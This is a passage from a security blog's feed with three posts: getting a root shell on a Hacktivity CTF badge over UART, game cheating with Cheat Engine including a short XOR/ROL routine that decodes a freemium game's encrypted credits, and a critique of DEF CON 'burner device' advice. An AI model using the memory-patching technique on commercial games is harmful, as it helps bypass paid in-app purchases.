style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;269&quot; data-original-width=&quot;663&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/Screen2BShot2B2019-09-162Bat2B17.52.55.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;In this case, it is connected to COM3. So let's fire up our favorite putty.exe, select Serial, choose COM3, add speed 9600, and you are ready to go!&lt;/div&gt;&lt;br /&gt;&lt;div&gt;&lt;a href=&quot;https://z6543.github.io/_img/Screen2BShot2B2019-09-162Bat2B18.22.04.png&quot; src=&quot;https://z6543.github.io/_img/Screen2BShot2B2019-09-162Bat2B18.22.04.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;308&quot; data-original-width=&quot;710&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/Screen2BShot2B2019-09-162Bat2B18.22.04.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;You might check the end of the macOS section in case you can't see anything. Timing is everything.&lt;br /&gt;&lt;br /&gt;&lt;h2&gt;The CTF&lt;/h2&gt;&lt;pre&gt;Welcome to the Hacktivity 2018 badge challenge!&lt;br /&gt;&lt;br /&gt;This challenge consists of several tasks with one or more levels of&lt;br /&gt;difficulty. They are all connected in some way or another to HW RE&lt;br /&gt;and there's no competition, the whole purpose is to learn things.&lt;br /&gt;&lt;br /&gt;Note: we recommend turning on local echo in your terminal!&lt;br /&gt;Also, feel free to ask for hints at the Hackcenter!&lt;br /&gt;&lt;br /&gt;Choose your destiny below:&lt;br /&gt;&lt;br /&gt;  1. Visual HW debugging&lt;br /&gt;  2. Reverse engineering&lt;br /&gt;  3. RF hacking&lt;br /&gt;  4. Crypto protection&lt;br /&gt;&lt;br /&gt;Enter the number of the challenge you're interested in and press [&lt;br /&gt;&lt;/pre&gt;&lt;/div&gt;Excellent, now you are ready to hack this! In case you are lost in controlling the screen command, go to &lt;a href=&quot;https://linuxize.com/post/how-to-use-linux-screen/&quot;&gt;https://linuxize.com/post/how-to-use-linux-screen/&lt;/a&gt;.&lt;br /&gt;&lt;br /&gt;I will not spoil any fun in giving out the challenge solutions here. It is still your task to find solutions for these.&lt;br /&gt;&lt;br /&gt;But here is a catch. You can get a root shell on the device. And it is pretty straightforward. Just carefully remove the Omega shield from the badge. Now you see two jumpers; by default, these are connected together as UART1. As seen below.&lt;br /&gt;&lt;/div&gt;
&lt;div&gt;&lt;a href=&quot;https://z6543.github.io/_img/IMG_8641.JPG&quot; src=&quot;https://z6543.github.io/_img/IMG_8641.JPG&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img src=&quot;https://z6543.github.io/_img/IMG_8641.JPG&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div&gt;But what happens if you move these jumpers to UART0? Guess what, you can get a root shell! This is what I call privilege escalation on the HW level :) But first, let's connect the Omega shield back. Also, for added fun, this new interface speaks on 115200 baud, so you should change your screen parameters to 115200. Also, the new interface has a different ID under /dev, but I am sure you can figure this out from now on.&lt;/div&gt;
&lt;div&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div&gt;&lt;img border=&quot;0&quot; src=&quot;https://z6543.github.io/_img/IMG_8642.JPG&quot; /&gt;&lt;/div&gt;
&lt;div&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div&gt;&lt;span style=&quot;text-align: justify;&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span style=&quot;text-align: justify;&quot;&gt;If you connect to the device during boot time, you can see a lot of exciting debug information about the device. And after it boots, you just get a root prompt. Woohoo! &lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span style=&quot;text-align: justify;&quot;&gt;But what can you do with this root access? Well, for starters, how about running &lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span style=&quot;text-align: justify;&quot;&gt;# strings hello | less&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span style=&quot;text-align: justify;&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span style=&quot;text-align: justify;&quot;&gt;From now on, you are on your own to hack this badge. Happy hacking.&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span style=&quot;text-align: justify;&quot;&gt;Big thanks to &lt;a href=&quot;https://twitter.com/0xmaro&quot; target=&quot;_blank&quot;&gt;Attila Marosi-Bauer&lt;/a&gt; and &lt;a href=&quot;https://hsbp.org/HomePage&quot; target=&quot;_blank&quot;&gt;Hackerspace Budapest&lt;/a&gt; for developing this badge and the contests.&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span style=&quot;text-align: justify;&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span style=&quot;text-align: justify;&quot;&gt;PS: In case you want to use the radio functionality of the badge, see below how you should solder the parts to it. By default, you can process slow speed radio frequency signals on GPIO19. But for higher transfer speeds, you should wire the RF module DATA OUT pin with the RX1 free together.&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span style=&quot;text-align: justify;&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;a href=&quot;https://z6543.github.io/_img/IMG_8638.JPG&quot; src=&quot;https://z6543.github.io/_img/IMG_8638.JPG&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;1600&quot; data-original-width=&quot;1200&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/IMG_8638.JPG&quot; width=&quot;300&quot; /&gt;&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>Hacking freemium games - the evolution of PC game cheating</title>
   <link href="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/cheating/freemium/games/hacking/2019/01/14/Hacking-freemium-games-the-evolution-of-PC-game-cheating.html"/>
   <updated>2019-01-14T13:45:26+00:00</updated>
   <id>https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/cheating/freemium/games/hacking/2019/01/14/Hacking-freemium-games---the-evolution-of-PC-game-cheating</id>
   <content type="html">&lt;div style=&quot;&quot;&gt;This post is going to be a rather strange post compared to previous ones. But bear with me, in the middle of the post you will see why this post fits the IT security topic.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;I'm also terribly sorry for not posting recently, but I was busy with my &lt;a href=&quot;http://www.securitytube-training.com/online-courses/securitytube-python-scripting-expert/&quot; target=&quot;_blank&quot;&gt;SPSE&lt;/a&gt; and &lt;a href=&quot;http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/index.html&quot; target=&quot;_blank&quot;&gt;SLAE&lt;/a&gt; certification. Both are recommended for Python and Assembly noobs like me. But back to this post.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;
&lt;h2 style=&quot;text-align: justify;&quot;&gt;A little bit of history&lt;/h2&gt;
&lt;div style=&quot;&quot;&gt;Cheating in games started as help for game testers. By using invincibility or infinite ammo testers were able to test the game quicker, which meant less money spent on testing. I personally use cheat codes in games, depending on my mood. Sometimes it feels good to slash all the opponents while I'm invincible, sometimes it is more fun to play the game without cheats. One can argue whether cheating in games is OK or not, but I believe it depends, there is no black or white. But one thing is for sure, it is part of the gaming industry. There is huge demand for cheats. There were even cheat books printed on paper...&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div align=&quot;justify&quot;&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/cheats10.jpg&quot; src=&quot;https://z6543.github.io/_img/cheats10.jpg&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img align=&quot;justify&quot; border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/cheats10.jpg&quot; width=&quot;228&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;h2 style=&quot;text-align: justify;&quot;&gt;The different types of cheats (on PC)&lt;/h2&gt;
&lt;div style=&quot;&quot;&gt;There are different types of cheats in PC gaming. Following is a noncomplete list of these cheats:&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;
&lt;h3 style=&quot;text-align: justify;&quot;&gt;Cheat codes&lt;/h3&gt;
&lt;div style=&quot;&quot;&gt;The good old IDDQD type of cheats. These are left in the game by the developers intentionally. Nothing interesting here.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;
&lt;h3 style=&quot;text-align: justify;&quot;&gt;Edit memory&lt;/h3&gt;
&lt;div style=&quot;&quot;&gt;This is my favorite. I will talk about this at the end of the post. Whenever a user launches a new program, the program's whole memory is accessible (read/write) to every other program launched by the user. And since the memory stores the current game state (health, ammo, armor, etc.), these values can be changed easily. In the good old times, there were &lt;a href=&quot;http://ready64.it/articoli/_files/043_pokesc64.txt&quot; target=&quot;_blank&quot;&gt;POKE&lt;/a&gt; commands to do this cheats, and the memory address to write into was published by people who found where the game stores the most critical states about the game.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/hqdefault.jpg&quot; src=&quot;https://z6543.github.io/_img/hqdefault.jpg&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/hqdefault.jpg&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;h3 style=&quot;text-align: justify;&quot;&gt;&lt;/h3&gt;
&lt;h3 style=&quot;text-align: justify;&quot;&gt;Code injection&lt;/h3&gt;
&lt;div style=&quot;&quot;&gt;This is like patching the game code. For example, one can change the &quot;DEC (pointer to your current health)&quot; instruction with NOP (do nothing), thus becoming invincible. In multi-player cheats, there is the aimbot to help you aim at enemies, wallhack to see through the wall, increase hitbox of the enemy for smoother hit, or in MMORPGs, one can write macros to collect items while the player is not online. I would say the so-called &quot;&lt;a href=&quot;http://en.wikipedia.org/wiki/Trainer_(games)&quot; target=&quot;_blank&quot;&gt;trainers&lt;/a&gt;&quot; more or less fit into this category and the previous one.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;
&lt;h3 style=&quot;text-align: justify;&quot;&gt;Saved game editor&lt;/h3&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;The first time a kid meets a hex-editor &lt;i&gt;(just like the co-author of this blog did with SIM City when he was 10 years old - David)&lt;/i&gt;. It can teach a lot about file structures, the hexadecimal numeral system, etc. Fun times. &lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h3 style=&quot;text-align: justify;&quot;&gt;Hacking game server&lt;/h3&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;Not very common, but even more fun. Warning: endless trolling possibilities in multi-player games ahead :) How to hack a game server? Well, I think this might deserve another full blog post ...&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h3 style=&quot;text-align: justify;&quot;&gt;Network traffic hacking&lt;/h3&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;One last necessary type of cheating is to modify network traffic between the client and the game server. AFAIK SSL is not universal in gaming, so stunnel is not needed for this hack, but ettercap can help in changing the communication.&lt;/div&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;h2 style=&quot;text-align: justify;&quot;&gt;Why cheating becomes more critical (and challenging)?&lt;/h2&gt;
&lt;div style=&quot;&quot;&gt;Now in the age of in-app-payments, the game creators are no longer thinking about cheats as funny things but something to be destroyed to the ground. Because cheating decreases its revenue. Or not. At least they think it does. To quote Wikipedia here, &quot;cheating in such games is nonetheless a legal grey area because there are no laws against modifying software which is already owned, as detailed in the Digital Millennium Copyright Act.&quot; &lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;A lot of online games include anti-cheating components like PunkBuster, nProtect GameGuard, or Valve Anti-Cheat. This whole cheating/anti-cheating industry is the same as the virus/anti-virus industry. A cat and mouse game.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;
&lt;h3 style=&quot;text-align: justify;&quot;&gt;Freemium games&lt;/h3&gt;
&lt;div style=&quot;&quot;&gt;If you have not played with &quot;freemium&quot; games, you should watch South Park season 18, episode 6. - &quot;Freemium Isn't Free.&quot; If you did play with freemium games, you definitely have to watch it :) There are many problems with freemium games. It is free to install, free to play. The first 3-4 hours might be fun to play. But after that, it turns out it is impossible to advance in the game without paying money for it. And by spending cash, I mean spending a LOT! Let's have a look at today's example, an arcade racing video game.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/asphalt1.png&quot; src=&quot;https://z6543.github.io/_img/asphalt1.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/asphalt1.png&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;For 99.99 USD, you can get 3 000 000 credit. For almost double the price of a new PC game, you can get these credits. In this particular game, I estimate one have to play ~6-24 hours constantly to get this amount of credit. But by playing ~6 hours, I mean 6 hours without progress in the game! Kind of boring. And what do you get from 3 000 000 credit? You can buy one of the most expensive cars, but can't tune them fully. You have to play more (without progress) or buy more. But guess what, there are more cars you can't buy by only playing the game. Those are only available via in-app-purchase.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/asphalt2.png&quot; src=&quot;https://z6543.github.io/_img/asphalt2.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/asphalt2.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Even though the player has 58 765 533 credits, it is not possible to buy this car. Only available through real money.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/asphalt3.png&quot; src=&quot;https://z6543.github.io/_img/asphalt3.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/asphalt3.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;So, what are your possibilities? You are either Richie Rich, and can afford the money to buy these. Or you can be insane, and try to play the game without in-app-purchase. Or give up the game and try another freemium ... Or, you can try to hack the game!&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;
&lt;h2 style=&quot;text-align: justify;&quot;&gt;Hack all the freemium games!&lt;/h2&gt;
&lt;div style=&quot;&quot;&gt;Although I was not playing this racing game from day one, I was able to witness the evolution of the cheats against this game. The cheats which worked in one day was not working one month later. The game is continuously updated to defeat the newly published cheats.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;
&lt;h3 style=&quot;text-align: justify;&quot;&gt;Noob start&lt;/h3&gt;
&lt;div style=&quot;&quot;&gt;So, I want to hack this game, what is the first thing a noob like me does? &lt;strike&gt;Bing it!&lt;/strike&gt; Google it! &lt;/div&gt;
&lt;div style=&quot;&quot;&gt;From the first page result, let's check this tool:&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/Asphalt-8-Airborne-Hack-Tool-Screenshot.png&quot; src=&quot;https://z6543.github.io/_img/Asphalt-8-Airborne-Hack-Tool-Screenshot.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/Asphalt-8-Airborne-Hack-Tool-Screenshot.png&quot; width=&quot;390&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;While trying to download that, I just have to give my email address to spammers, or my mobile number will be subscribed to premium rate text messages. What fun.&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/asphalt4.png&quot; src=&quot;https://z6543.github.io/_img/asphalt4.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/asphalt4.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Another &quot;cheat&quot; program will install malware/adware on your computer. &lt;b&gt;&lt;u&gt;&lt;span style=&quot;color: red;&quot;&gt;Never ever try these programs.&lt;/span&gt;&lt;/u&gt;&lt;/b&gt; They are fake 99% of the time and after installing those you will have another problem, not just how to hack freemium games.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;
&lt;h3 style=&quot;text-align: justify;&quot;&gt;Beginners start - Cheat engine&lt;/h3&gt;
&lt;div&gt;&lt;span style=&quot;text-align: justify;&quot;&gt;When I first heard about hacking games in memory, I visualized hours of OllyDBG/ImmunityDBG/(insert your favorite Windows debugger here). It turned out, there are some specialized tools to help you with cheating the game. No assembly knowledge required. My favourite tool is &lt;/span&gt;&lt;a href=&quot;http://www.cheatengine.org/downloads.php&quot; style=&quot;text-align: justify;&quot; target=&quot;_blank&quot;&gt;CheatEngine&lt;/a&gt;&lt;span style=&quot;text-align: justify;&quot;&gt;. I highly recommend to download it and spend 10 minutes to get past the built-in tutorial levels to get a feeling about this tool. It's super duper awesome.&lt;/span&gt;&lt;br /&gt;&lt;span style=&quot;text-align: justify;&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/cheat.png&quot; src=&quot;https://z6543.github.io/_img/cheat.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/cheat.png&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div&gt;&lt;span style=&quot;text-align: justify;&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span style=&quot;text-align: justify;&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;When I first tried to hack this game myself, I scanned the memory for my actual credit and tried to change that, no luck. Keep reading, you will see what happened.&lt;br /&gt;&lt;br /&gt;The second cheat I tried with cheat engine was &lt;a href=&quot;https://www.youtube.com/watch?v=kz9k4vOpns0&quot; target=&quot;_blank&quot;&gt;something like this&lt;/a&gt;: &lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;ol&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;Start the game, play the first level, and check how many credits is paid for winning the race. Pro tip: use dual display for full-screen game cheating.&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;Restart the same level, attach Cheat Engine to the game's process&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;Scan the memory for the same value at the beginning of the race&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;Scan the memory for the same value at the end of the game. The intersect of the first and second scan includes the real value where the credit is stored for winning the race.&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;Change the values (both the real one and some false positives) to something big&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;Watch the game to crash&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;Be amazed at the money you received&lt;/li&gt;&lt;/ol&gt;&lt;div&gt;&lt;div style=&quot;&quot;&gt;Nowadays, most of the cheats on YouTube does not work. Except for these &lt;a href=&quot;https://www.youtube.com/watch?v=f5a3CGVLwAI&quot; target=&quot;_blank&quot;&gt;kind of cheats&lt;/a&gt;. I don't want to recreate that tutorial, so you should watch it first then come back.&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/asphalt5.png&quot; src=&quot;https://z6543.github.io/_img/asphalt5.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/asphalt5.png&quot; width=&quot;616&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;Are you back? Great. Do you have any idea what have you just seen? No? Well, in this case, don't try this at home. Copy-pasting &lt;a href=&quot;http://blog.zoller.lu/2009/07/0pen0wnc-shellcode-dissasembled.html&quot; target=&quot;_blank&quot;&gt;assembly code from random internet posts&lt;/a&gt; and running on your computer is always a bad idea. It is precisely as risky as downloading free programs from random internet sites.&lt;br /&gt;&lt;br /&gt;Although I have not seen people trolling others with this cheat engine type of shellcode, I think the time will come when these will be turned into something terrible. These shellcodes might work, or might harm your computer. The good news is, we can have a look at the code and analyze it. &lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;When you open CheatEngine and try to define a new custom type, you are greeted with a skeleton assembly code. I don't want to detail what all the skeleton code does, let's just focus on the difference between the skeleton code and the code used in the video. This is the &quot;decrypt function&quot;:&lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;
&lt;pre class=&quot;prettyprint&quot;&gt;xor eax, 0baadf00d&lt;br /&gt;rol eax, 0e&lt;br /&gt;&lt;/pre&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;What does it mean? The actual credit is encrypted in memory. If you want to scan it in memory, you won't be able to find it. But! The encryption is rotating the value to the right (ROR) with 0xE (14 in decimal), and after that, it is XOR-ed with 0xbaadf00d. Decrypting it is the inverse of the functions in reverse order (in this particular case, the order does not matter, but that's not the point). The inverse function of XOR is XOR, and the inverse function of ROR (rotate right) is ROL (rotate left). Now that we analyzed the assembly code, we can be sure that it is safe to execute. Just follow the video and see your coins falling from the sky. For free. In a freemium game. Have fun!&lt;br /&gt;&lt;br /&gt;&lt;h3&gt;Encrypt memory - applications at financial institutions&lt;/h3&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;Another exciting thing is that I don't recall any thick client applications in the financial industry encrypting the values in memory. And I agree, there are more significant problems with thick client applications than not encrypting the essential values in memory. But still, some thick client applications are regularly updated, maintained. Maybe it is a good idea to encrypt the values in memory. It will make attackers' life harder. Not impossible, but harder. Perhaps the developers of these applications should learn from the gaming industry (or from malware developers for that matter) because it is a shame that an arcade racing game or an FPS is protected better than an application responsible for transacting millions of dollars. Just think about the RAM scraping malware stealing millions of credit card data ...&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;h2 style=&quot;text-align: justify;&quot;&gt;Moral of the story&lt;/h2&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Cheating is part of the gaming history, and the freemium games are trying to take away the cheats from the gamers because they want money. Thanks to CheatEngine and some clever hacks, these programs can be still beaten. And guess what, there is CheatEngine for Android - although it did not work for me on the latest Android. And sometimes, hacking all kinds of applications can be more comfortable with CheatEngine, compared to traditional debuggers.&lt;br /&gt;&lt;br /&gt;Also, always check the code before executing it! And when you find something cool, publish it, so everyone could enjoy the games!&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>How to build a "burner device" for DEF CON in one easy step</title>
   <link href="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/build/burner/laptop/phone/defcon/howto/2018/08/15/How-to-build-a-burner-device-for-DEF-CON-in-one-easy-step.html"/>
   <updated>2018-08-15T13:31:11+00:00</updated>
   <id>https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/build/burner/laptop/phone/defcon/howto/2018/08/15/How-to-build-a-"burner-device"-for-DEF-CON-in-one-easy-step</id>
   <content type="html">&lt;div style=&quot;&quot;&gt;TL;DR: Don't build a burner device. Probably this is not the risk you are looking for.&lt;/div&gt;
&lt;h3 style=&quot;text-align: justify;&quot;&gt;Introduction&lt;/h3&gt;
&lt;div style=&quot;&quot;&gt;Every year before DEF CON people starts to give &lt;a href=&quot;https://blog.erratasec.com/2017/07/burner-laptops-for-def-con.html&quot; target=&quot;_blank&quot;&gt;advice&lt;/a&gt; to attendees to bring &quot;burner devices&quot; to DEF CON. Some people also start to create &lt;a href=&quot;https://github.com/CrowdStrike/travel-laptop&quot; target=&quot;_blank&quot;&gt;long lists&lt;/a&gt; on how to build burner devices, especially laptops. But the deeper we look into the topic, the more confusing it gets. Why are we doing this? Why are we recommending this? Are we focusing on the right things?&lt;/div&gt;
&lt;h3 style=&quot;text-align: justify;&quot;&gt;What is a &quot;burner device&quot; used for?&lt;/h3&gt;
&lt;div style=&quot;&quot;&gt;For starters, the whole &quot;burner device&quot; concept is totally misunderstood, even within the ITSEC community. A &quot;burner device&quot; is used for non-attribution. You know, for example, you are a spy and you don't want the country where you live to know that you are communicating with someone else. I believe this is not the situation for most attendees at DEF CON. More info about the meaning of &quot;burner&quot; &lt;a href=&quot;https://twitter.com/Viss/status/877400669669306369&quot; target=&quot;_blank&quot;&gt;https://twitter.com/Viss/status/877400669669306369&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Burner phone means it has a throwaway SIM card with a throwaway phone, used for one specific operation only. &lt;b&gt;You don't use the &quot;burner device&quot; to log in to your e-mail account or to VPN to your work or home.&lt;/b&gt;&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/2524_86.JPG&quot; src=&quot;https://z6543.github.io/_img/2524_86.JPG&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;1024&quot; data-original-width=&quot;768&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/2524_86.JPG&quot; width=&quot;300&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;But let's forget this word misuse issue for a moment, and focus on the real problem.&lt;/div&gt;
&lt;h3 style=&quot;text-align: justify;&quot;&gt;The bad advice&lt;/h3&gt;
&lt;div style=&quot;&quot;&gt;The Internet is full of articles focusing on the wrong things, especially when it comes to &quot;burner devices&quot;. Like how to build a burner laptop, without explaining why you need it or how to use it.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;The problem with this approach is that people end up &quot;burning&quot; (lame wordplay, sorry) significant resources for building a secure &quot;burner device&quot;. But people are not educated about how they should use these devices.&lt;/div&gt;
&lt;h3 style=&quot;text-align: justify;&quot;&gt;The threats&lt;/h3&gt;
&lt;div style=&quot;&quot;&gt;I believe the followings are some real threats which are higher when you travel:&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;1. The laptop getting lost or stolen.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;2. The laptop getting inspected/copied at the border.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;These two risks have nothing to do with DEF CON, this is true for every travel.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Some other risks which are usually mentioned when it comes to &quot;burner devices&quot; and DEF CON:&lt;/div&gt;
